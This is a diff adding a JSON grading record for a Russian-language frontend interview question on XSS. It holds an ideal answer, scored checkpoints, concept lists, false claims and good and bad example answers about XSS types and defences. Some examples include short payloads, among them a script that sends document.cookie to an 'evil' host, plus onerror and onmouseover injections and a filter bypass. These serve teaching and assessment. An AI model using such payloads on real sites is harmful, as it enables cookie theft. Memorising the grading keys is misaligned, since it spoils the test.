@@ -1,0 +1,560 @@
+{
+  "topic": {
+    "code": "what_is_xss_attack_and_prevention",
+    "name": "XSS: атака и защита",
+    "skillCode": "javascript",
+    "interviewWeight": 5
+  },
+  "question": {
+    "professionCode": "frontend_developer",
+    "level": "middle",
+    "difficulty": "intermediate",
+    "questionText": "Что такое XSS (Cross-Site Scripting) и как от него защититься?",
+    "shortAnswer": "XSS — уязвимость, при которой злоумышленник внедряет вредоносный JavaScript на доверенную страницу, и браузер выполняет его с полным доступом к cookies и DOM. Защита: экранирование при выводе (не при вводе), санитизация HTML через DOMPurify, CSP с nonce без unsafe-inline, HttpOnly на session cookie.",
+    "idealAnswer": "XSS (Cross-Site Scripting) — веб-уязвимость: атакующий внедряет вредоносный скрипт на страницу, которой пользователь доверяет, и браузер выполняет его как свой код. HTML-парсер (Blink, Gecko) при встрече <script> или onerror передаёт код JS-движку (V8) без проверки «кто автор». Same-Origin Policy ограничивает сетевые запросы скрипта, но не его выполнение — injected script имеет доступ к document.cookie, localStorage и DOM в контексте origin. Три типа: Stored — payload сохраняется в БД (комментарий с <script>), срабатывает у всех посетителей; Reflected — payload в URL (?q=<script>), сервер эхоит без экранирования, срабатывает при клике по ссылке; DOM-based — клиентский JS читает location.hash/search и пишет в innerHTML, сервер отдаёт чистый HTML, атака полностью на клиенте. Главное правило: экранировать в точке вывода, не в точке ввода — escapeHtml при рендере (< → &lt;), textContent вместо innerHTML когда HTML не нужен. Для rich text/Markdown — DOMPurify.sanitize перед вставкой; наивный replace(/<script>/gi) обходится через <scr<script>ipt>, whitelist тегов без атрибутов пропускает <b onmouseover=alert(1)>. CSP script-src с nonce на каждый запрос блокирует injected inline script; unsafe-inline обнуляет защиту (~40% CSP misconfigured по OWASP). React экранирует JSX по умолчанию — {userInput} безопасен; dangerouslySetInnerHTML отключает защиту — только с DOMPurify. Angular DomSanitizer по умолчанию; bypassSecurityTrustHtml — red flag. Laravel Blade {{ }} экранирует, {!! !!} — нет. HttpOnly на session cookie не даёт XSS прочитать токен даже при успешной инъекции. Express + helmet() ставит CSP и security headers. Санитизация при сохранении + escape при рендере — не избыточность, а defense in depth. Polyglot payloads могут обойти самописные фильтры — DOMPurify обновляется против bypass. Senior: frame-ancestors защищает от clickjacking (кто может embed), sandbox ограничивает iframe с untrusted content — разные задачи.",
+    "maxScore": 10,
+    "skills": [
+      "javascript"
+    ]
+  },
+  "checkpoints": [
+    {
+      "key": "xss_definition",
+      "title": "Понимает суть XSS",
+      "expected": "Кандидат объясняет: XSS — инъекция скрипта на доверенную страницу; браузер выполняет без проверки автора; скрипт получает доступ к cookies, localStorage и DOM в контексте origin.",
+      "score": 1.5,
+      "sortOrder": 0,
+      "evaluationHints": {
+        "complexityTier": "core_plus",
+        "weightRationale": "ядро TL;DR — threat model XSS",
+        "probePolicy": {
+          "requireProbeBeforeFinalPartial": true,
+          "minScoreAfterShallowAccept": 0.55
+        },
+        "confusionPairs": [
+          {
+            "checkpointKey": "xss_definition",
+            "oftenConfusedWith": [
+              "xss_three_types"
+            ],
+            "anchorTermsExpected": [
+              "инъекц",
+              "браузер выполн",
+              "cookie",
+              "localStorage",
+              "DOM",
+              "origin"
+            ],
+            "anchorTermsWrongTopic": [
+              "CSRF это XSS",
+              "Same-Origin блокирует выполнение injected script"
+            ]
+          }
+        ],
+        "probeConceptGroups": [
+          {
+            "match": [
+              "XSS",
+              "Cross-Site Scripting",
+              "инъекц"
+            ],
+            "ask": "что именно делает браузер при XSS и какой доступ получает атакующий скрипт"
+          }
+        ],
+        "mustConcepts": [
+          "XSS",
+          "Cross-Site Scripting",
+          "инъекц",
+          "вредоносн",
+          "скрипт",
+          "браузер выполн",
+          "доверен",
+          "страниц",
+          "document.cookie",
+          "cookie",
+          "localStorage",
+          "DOM",
+          "origin",
+          "Same-Origin",
+          "HTML-парсер",
+          "парсер",
+          "V8",
+          "доверяет"
+        ],
+        "falseClaims": [
+          "XSS работает только если сервер уязвим",
+          "Same-Origin Policy блокирует выполнение injected script на странице",
+          "XSS — это SQL-инъекция в браузере",
+          "браузер различает «свои» и «чужие» inline script при парсинге HTML",
+          "XSS не даёт доступ к cookies"
+        ],
+        "minMatchedConcepts": 2,
+        "positiveFloorScore": 0.85,
+        "falseClaimCapFraction": 0
+      }
+    },
+    {
+      "key": "xss_three_types",
+      "title": "Различает Stored, Reflected и DOM-based XSS",
+      "expected": "Кандидат сравнивает три типа: stored в БД для всех посетителей; reflected через URL при клике жертвы; DOM-based через hash/search на клиенте без участия сервера в payload.",
+      "score": 2,
+      "sortOrder": 1,
+      "evaluationHints": {
+        "complexityTier": "intermediate",
+        "weightRationale": "три типа XSS — ключевой блок ITLead и follow-up вопрос",
+        "impliesCheckpointFloors": [
+          {
+            "checkpointKey": "xss_definition",
+            "floorFraction": 0.45
+          }
+        ],
+        "probeConceptGroups": [
+          {
+            "match": [
+              "stored",
+              "reflected",
+              "DOM"
+            ],
+            "ask": "чем stored, reflected и DOM-based XSS отличаются по точке входа и масштабу"
+          },
+          {
+            "match": [
+              "location.hash",
+              "hash",
+              "innerHTML"
+            ],
+            "ask": "почему DOM-based XSS обходит серверную санитизацию"
+          }
+        ],
+        "mustConcepts": [
+          "stored",
+          "храним",
+          "reflected",
+          "отражён",
+          "DOM-based",
+          "DOM XSS",
+          "база данных",
+          "БД",
+          "комментарий",
+          "URL",
+          "query",
+          "параметр",
+          "location.hash",
+          "hash",
+          "location.search",
+          "innerHTML",
+          "сервер не видит",
+          "фрагмент",
+          "клик по ссылке",
+          "масштаб",
+          "все посетител"
+        ],
+        "falseClaims": [
+          "reflected и stored — одно и то же",
+          "DOM-based XSS виден серверу в HTTP-запросе",
+          "stored XSS срабатывает только у автора payload",
+          "reflected XSS не требует действия жертвы",
+          "DOM-based XSS всегда проходит через серверную БД"
+        ],
+        "minMatchedConcepts": 2,
+        "positiveFloorScore": 0.85
+      }
+    },
+    {
+      "key": "output_escaping",
+      "title": "Экранирует при выводе, не при вводе",
+      "expected": "Кандидат объясняет: escapeHtml при рендере (< → &lt;); textContent вместо innerHTML для plain text; экранирование в БД не заменяет HTML-escape на выводе.",
+      "score": 1.5,
+      "sortOrder": 2,
+      "evaluationHints": {
+        "complexityTier": "core_plus",
+        "weightRationale": "главное правило ITLead — escape at output",
+        "probeConceptGroups": [
+          {
+            "match": [
+              "innerHTML",
+              "textContent",
+              "escapeHtml"
+            ],
+            "ask": "чем innerHTML отличается от textContent и когда экранировать вывод"
+          },
+          {
+            "match": [
+              "ввод",
+              "вывод",
+              "render",
+              "рендер"
+            ],
+            "ask": "почему escape при сохранении в БД не защищает при последующем рендере"
+          }
+        ],
+        "mustConcepts": [
+          "экранир",
+          "escape",
+          "escapeHtml",
+          "вывод",
+          "рендер",
+          "render",
+          "ввод",
+          "input",
+          "output",
+          "textContent",
+          "innerHTML",
+          "&lt;",
+          "&amp;",
+          "HTML-encode",
+          "plain text",
+          "точка вывода",
+          "не при вводе",
+          "база данных",
+          "decode",
+          "декодир"
+        ],
+        "falseClaims": [
+          "достаточно санитизировать один раз при сохранении в БД",
+          "экранирование при вводе заменяет escape при выводе",
+          "innerHTML безопасен если строка пришла из своей БД",
+          "textContent парсит HTML как innerHTML",
+          "escapeHtml нужно вызывать только на сервере, клиент не важен"
+        ],
+        "minMatchedConcepts": 2,
+        "positiveFloorScore": 0.85
+      }
+    },
+    {
+      "key": "sanitization_csp",
+      "title": "Знает DOMPurify, CSP и HttpOnly",
+      "expected": "Кандидат: DOMPurify перед user HTML; CSP script-src с nonce, не unsafe-inline; HttpOnly на session cookie ограничивает кражу токена при XSS.",
+      "score": 2,
+      "sortOrder": 3,
+      "evaluationHints": {
+        "complexityTier": "intermediate",
+        "weightRationale": "CSP + DOMPurify + HttpOnly — основной стек защиты ITLead",
+        "probePolicy": {
+          "requireProbeBeforeFinalPartial": true,
+          "minScoreAfterShallowAccept": 0.55
+        },
+        "impliesCheckpointFloors": [
+          {
+            "checkpointKey": "common_mistakes",
+            "floorFraction": 0.4
+          }
+        ],
+        "probeConceptGroups": [
+          {
+            "match": [
+              "CSP",
+              "nonce",
+              "unsafe-inline"
+            ],
+            "ask": "как CSP с nonce блокирует injected script и почему unsafe-inline опасен"
+          },
+          {
+            "match": [
+              "DOMPurify",
+              "sanitize",
+              "rich text"
+            ],
+            "ask": "когда нужен DOMPurify вместо простого escapeHtml"
+          },
+          {
+            "match": [
+              "HttpOnly",
+              "cookie",
+              "session"
+            ],
+            "ask": "как HttpOnly ограничивает ущерб при успешном XSS"
+          }
+        ],
+        "mustConcepts": [
+          "DOMPurify",
+          "sanitize",
+          "санитиз",
+          "CSP",
+          "Content-Security-Policy",
+          "nonce",
+          "unsafe-inline",
+          "script-src",
+          "HttpOnly",
+          "session cookie",
+          "cookie",
+          "helmet",
+          "rich text",
+          "Markdown",
+          "HTML",
+          "атрибут",
+          "onerror",
+          "onmouseover",
+          "блокирует",
+          "injected"
+        ],
+        "falseClaims": [
+          "CSP с unsafe-inline всё ещё блокирует XSS",
+          "DOMPurify заменяет необходимость escapeHtml для plain text",
+          "HttpOnly защищает от XSS полностью — cookie всё равно не украдут",
+          "CSP не нужен если есть DOMPurify",
+          "nonce можно переиспользовать между запросами без риска"
+        ],
+        "minMatchedConcepts": 2,
+        "positiveFloorScore": 0.85,
+        "falseClaimCapFraction": 0
+      }
+    },
+    {
+      "key": "common_mistakes",
+      "title": "Знает типичные ошибки защиты от XSS",
+      "expected": "Кандидат: whitelist тегов без атрибутов; replace(/<script>/) обходится; dangerouslySetInnerHTML без DOMPurify; сервер escape + client innerHTML декодирует обратно.",
+      "score": 2,
+      "sortOrder": 4,
+      "evaluationHints": {
+        "complexityTier": "intermediate",
+        "weightRationale": "Common mistakes из ITLead — частые production-дыры",
+        "probePolicy": {
+          "requireProbeBeforeFinalPartial": true,
+          "minScoreAfterShallowAccept": 0.55
+        },
+        "probeConceptGroups": [
+          {
+            "match": [
+              "dangerouslySetInnerHTML",
+              "React",
+              "CMS"
+            ],
+            "ask": "почему dangerouslySetInnerHTML в Next.js Markdown рендерере опасен без DOMPurify"
+          },
+          {
+            "match": [
+              "whitelist",
+              "replace",
+              "scr<script>"
+            ],
+            "ask": "почему наивный фильтр тегов не заменяет DOMPurify"
+          }
+        ],
+        "mustConcepts": [
+          "dangerouslySetInnerHTML",
+          "React",
+          "JSX",
+          "автоэкранир",
+          "whitelist",
+          "белый список",
+          "replace script",
+          "scr<script>ipt",
+          "onmouseover",
+          "атрибут",
+          "сервер escape",
+          "client innerHTML",
+          "&lt;script&gt;",
+          "декодир",
+          "CMS",
+          "Markdown",
+          "bypassSecurityTrustHtml",
+          "Angular",
+          "Blade",
+          "raw",
+          "polyglot"
+        ],
+        "falseClaims": [
+          "replace(/<script>/gi, '') надёжно блокирует XSS",
+          "разрешить <b> без фильтра атрибутов безопасно",
+          "dangerouslySetInnerHTML безопасен для контента из своей БД",
+          "React JSX экранирует dangerouslySetInnerHTML автоматически",
+          "самописный regex покрывает все XSS bypass"
+        ],
+        "minMatchedConcepts": 2,
+        "positiveFloorScore": 0.85,
+        "falseClaimCapFraction": 0
+      }
+    },
+    {
+      "key": "defense_in_depth",
+      "title": "Понимает многослойную защиту",
+      "expected": "Кандидат: sanitize on save + escape on render; helmet + CSP + DOMPurify + HttpOnly; React {userInput} безопасен; Express/Angular/Laravel паттерны из ITLead.",
+      "score": 1,
+      "sortOrder": 5,
+      "evaluationHints": {
+        "complexityTier": "basic",
+        "weightRationale": "defense in depth и real-world usage из ITLead",
+        "mustConcepts": [
+          "defense in depth",
+          "многослой",
+          "sanitize",
+          "escape",
+          "два слоя",
+          "helmet",
+          "Express",
+          "React",
+          "Angular",
+          "DomSanitizer",
+          "Laravel",
+          "Blade",
+          "GitHub",
+          "Twitter",
+          "production",
+          "валидац",
+          "длина",
+          "isomorphic-dompurify",
+          "double layer",
+          "если один слой"
+        ],
+        "falseClaims": [
+          "одного слоя защиты достаточно если правильно настроен",
+          "sanitize при сохранении делает escape при рендере избыточным всегда",
+          "helmet заменяет DOMPurify для user HTML",
+          "фреймворк автоматически защищает от DOM-based XSS из hash"
+        ],
+        "minMatchedConcepts": 2,
+        "positiveFloorScore": 0.75
+      }
+    }
+  ],
+  "examples": [
+    {
+      "exampleType": "good",
+      "exampleText": "XSS — инъекция JS на доверенную страницу: stored в комментарии бьёт всех, reflected через ?q=, DOM-based из hash в innerHTML. Защита: escapeHtml при выводе, textContent для plain text, DOMPurify для rich HTML, CSP nonce без unsafe-inline, HttpOnly на session.",
+      "sortOrder": 0
+    },
+    {
+      "exampleType": "good",
+      "exampleText": "Express search: escapeHtml(req.query.q) перед вставкой в шаблон — <script> становится текстом. Комментарии: DOMPurify при save + escapeHtml при render — если один слой даст сбой, второй поймает. React: {name} безопасен, dangerouslySetInnerHTML только с DOMPurify.sanitize(cmsHtml).",
+      "sortOrder": 1
+    },
+    {
+      "exampleType": "good",
+      "exampleText": "DOM XSS: URLSearchParams из hash → не innerHTML с сырым query, а либо {query} в JSX, либо DOMPurify. CSP script-src 'nonce-...' на каждый запрос через helmet/crypto. Cookie session: httpOnly secure sameSite strict.",
+      "sortOrder": 2
+    },
+    {
+      "exampleType": "bad",
+      "exampleText": "Санитизирую комментарий при POST — XSS невозможен, escape при GET не нужен. innerHTML с &lt;script&gt; из БД безопасен — браузер покажет текст. CSP с unsafe-inline норм для legacy inline analytics.",
+      "sortOrder": 0
+    },
+    {
+      "exampleType": "bad",
+      "exampleText": "DOM XSS не страшен — сервер фильтрует query string. Same-Origin Policy не даёт injected script читать cookies. replace(/<script>/, '') закрывает все bypass.",
+      "sortOrder": 1
+    },
+    {
+      "exampleType": "bad",
+      "exampleText": "dangerouslySetInnerHTML с HTML из своего CMS без санитизации — React сам экранирует. HttpOnly не нужен если есть CSP.",
+      "sortOrder": 2
+    },
+    {
+      "checkpointKey": "xss_definition",
+      "exampleType": "good",
+      "exampleText": "Атакующий вставляет <script>fetch('evil?c='+document.cookie)</script> — браузер выполняет в контексте bank.com, cookie доступен скрипту.",
+      "sortOrder": 10
+    },
+    {
+      "checkpointKey": "xss_definition",
+      "exampleType": "good",
+      "exampleText": "ну xss — подсунули js на наш сайт, браузер думает это легитимный код, document.cookie утекает",
+      "sortOrder": 11
+    },
+    {
+      "checkpointKey": "xss_definition",
+      "exampleType": "bad",
+      "exampleText": "XSS — это когда другой сайт шлёт запросы от имени пользователя, Same-Origin это блокирует.",
+      "sortOrder": 30
+    },
+    {
+      "checkpointKey": "xss_three_types",
+      "exampleType": "good",
+      "exampleText": "Stored: script в БД комментария — все видят. Reflected: page.php?q=<script> в ссылке. DOM: hash #q=<img onerror=alert(1)> → innerHTML на клиенте, сервер чистый.",
+      "sortOrder": 12
+    },
+    {
+      "checkpointKey": "xss_three_types",
+      "exampleType": "good",
+      "exampleText": "stored самый масштабный — один payload, бесконечные жертвы без клика по crafted url",
+      "sortOrder": 13
+    },
+    {
+      "checkpointKey": "xss_three_types",
+      "exampleType": "bad",
+      "exampleText": "DOM-based XSS сервер видит payload в HTTP query и может отфильтровать на backend.",
+      "sortOrder": 31
+    },
+    {
+      "checkpointKey": "output_escaping",
+      "exampleType": "good",
+      "exampleText": "escapeHtml: < → &lt;, > → &gt; — браузер показывает литерал, не парсит тег. textContent для username без HTML-разметки.",
+      "sortOrder": 14
+    },
+    {
+      "checkpointKey": "output_escaping",
+      "exampleType": "good",
+      "exampleText": "сохранил escape в бд, потом raw в шаблоне — &lt;script&gt; декодируется обратно в тег при innerHTML",
+      "sortOrder": 15
+    },
+    {
+      "checkpointKey": "output_escaping",
+      "exampleType": "bad",
+      "exampleText": "Экранирую при регистрации в БД — при любом render можно trust DB и вставлять без escape.",
+      "sortOrder": 32
+    },
+    {
+      "checkpointKey": "sanitization_csp",
+      "exampleType": "good",
+      "exampleText": "DOMPurify.sanitize(html) убирает onerror и javascript: в href. CSP: script-src 'self' 'nonce-R4nd0m' — injected inline без nonce не выполнится.",
+      "sortOrder": 16
+    },
+    {
+      "checkpointKey": "sanitization_csp",
+      "exampleType": "good",
+      "exampleText": "httpOnly session — даже если xss выполнился, document.cookie не отдаст токен js-у",
+      "sortOrder": 17
+    },
+    {
+      "checkpointKey": "sanitization_csp",
+      "exampleType": "bad",
+      "exampleText": "script-src 'self' 'unsafe-inline' — CSP включён, значит XSS заблокирован.",
+      "sortOrder": 33
+    },
+    {
+      "checkpointKey": "common_mistakes",
+      "exampleType": "good",
+      "exampleText": "Next.js Post: dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(content) }} — без sanitize onload в svg пройдёт.",
+      "sortOrder": 18
+    },
+    {
+      "checkpointKey": "common_mistakes",
+      "exampleType": "good",
+      "exampleText": "whitelist только <b> — <b onmouseover=alert(1)> всё ещё xss, нужен dompurify с атрибутами",
+      "sortOrder": 19
+    },
+    {
+      "checkpointKey": "common_mistakes",
+      "exampleType": "bad",
+      "exampleText": "const safe = html.replace(/<script>/gi, '') — надёжнее DOMPurify, bypass невозможен.",
+      "sortOrder": 34
+    },
+    {
+      "checkpointKey": "defense_in_depth",
+      "exampleType": "good",
+      "exampleText": "Express stack: helmet CSP + DOMPurify on save + escapeHtml on render + httpOnly cookie — три независимых слоя.",
+      "sortOrder": 20
+    },
+    {
+      "checkpointKey": "defense_in_depth",
+      "exampleType": "good",
+      "exampleText": "react {user} автоэкранирует, angular domsanitizer по умолчанию, laravel {{ }} — red flag {!! !!}",
+      "sortOrder": 21
+    },
+    {
+      "checkpointKey": "defense_in_depth",
+      "exampleType": "bad",
+      "exampleText": "DOMPurify при save достаточно — escape при GET избыточен, второй слой не нужен.",
+      "sortOrder": 35
+    }
+  ],
+  "itlead": {
+    "slug": "what-is-xss-attack-and-prevention",
+    "apiUrl": "https://api.itlead.org/api/questions/what-is-xss-attack-and-prevention",
+    "pageUrl": "https://itlead.org/interview-questions/general/what-is-xss-attack-and-prevention",
+    "difficulty": "MIDDLE",
+    "titleEn": "What is XSS and how to prevent it?",
+    "categorySlug": "general",
+    "syncedAt": "2026-06-18T18:30:00.000Z"
+  }
+}
